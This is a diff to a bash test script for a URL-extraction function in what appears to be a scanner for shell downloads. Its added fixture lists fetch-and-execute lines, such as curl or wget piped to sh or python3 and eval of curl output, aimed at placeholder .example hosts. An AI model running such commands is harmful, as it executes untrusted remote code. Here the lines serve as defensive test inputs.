@@ -17,6 +17,10 @@ fail() { printf '  %sFAIL%s  %s\n' "$R" "$Z" "$1"; fails=$((fails+1)); }
 eq()   { [[ "$2" == "$3" ]] && pass "$1" || fail "$1 (want '$3' got '$2')"; }
 
 # --- unit: source individual functions without running main -------------------
+# extract_url and extract_fetch_urls share the scheme-less curl/wget helpers
+eval "$(grep '^URL_HOSTISH=' "$SC")"
+eval "$(sed -n '/^fetch_cmd_url()/,/^}/p'       "$SC")"
+eval "$(sed -n '/^fetch_cmd_frags()/,/^}/p'     "$SC")"
 eval "$(sed -n '/^extract_url()/,/^}/p'         "$SC")"
 # is_appimage before classify_input, which calls it: sourced individually, a
 # missing helper is not an error, it is a silent "command not found" and a
@@ -43,6 +47,31 @@ uurls="$(extract_fetch_urls "$utf")"
 [[ "$uurls" == *"https://a.example/s2.sh"* ]] && pass "extracts curl download URL" || fail "curl url"
 [[ "$uurls" == *"http://b.example/p.bin"* ]] && pass "extracts wget download URL" || fail "wget url"
 [[ "$uurls" != *"not-fetched"* ]] && pass "ignores non-download URL" || fail "over-extracts"
+rm -f "$utf"
+# scheme-less: curl/wget default to http://, so that is what gets staged
+cat > "$utf" <<'SCHEMELESS'
+curl -fsSL -o /tmp/s2 c.example/stage2.sh && sh /tmp/s2
+wget -qO- "d.example:8080/p.py" | python3
+bash <(curl -s e.example/s3.sh)
+x=$(curl -fsSL f.example/s4.sh); eval "$x"
+curl -fsSL "$BASE_URL/from-a-variable.sh"
+curl --version
+curl -H "Host: hdr.example" -fsSL i.example/s5.sh | sh
+curl -o out.json -H "Host: not-a-url.example" https://g.example/api
+echo see h.example/docs
+SCHEMELESS
+uurls="$(extract_fetch_urls "$utf")"
+for want in http://i.example/s5.sh http://c.example/stage2.sh http://d.example:8080/p.py http://e.example/s3.sh http://f.example/s4.sh https://g.example/api; do
+  [[ "$uurls" == *"$want"* ]] && pass "scheme-less stage: $want" || fail "scheme-less stage missing $want (got: $(tr '\n' ' ' <<< "$uurls"))"
+done
+[[ "$uurls" != *"from-a-variable"* && "$uurls" != *"not-a-url"* && "$uurls" != *"h.example"* && "$uurls" != *"out.json"* && "$uurls" != *"hdr.example"* ]] \
+  && pass "scheme-less: no variable/header/echo/output-file over-extraction" || fail "scheme-less over-extracts: $(tr '\n' ' ' <<< "$uurls")"
+# the script runs under set -e: a file with no http(s):// URL at all must still
+# reach the scheme-less pass rather than exit on the first grep's no-match
+printf 'curl -fsSL j.example/only.sh | sh\n' > "$utf.2"
+eq "scheme-less only, under set -e" "$( (set -e -o pipefail; extract_fetch_urls "$utf.2") )" "http://j.example/only.sh"
+rm -f "$utf.2"
+[[ "$(grep -c . <<< "$uurls")" == "6" ]] && pass "scheme-less: exactly the 6 fetched URLs" || fail "scheme-less count: $(tr '\n' ' ' <<< "$uurls")"
 rm -f "$utf"
 
 echo "unit: classify_input"
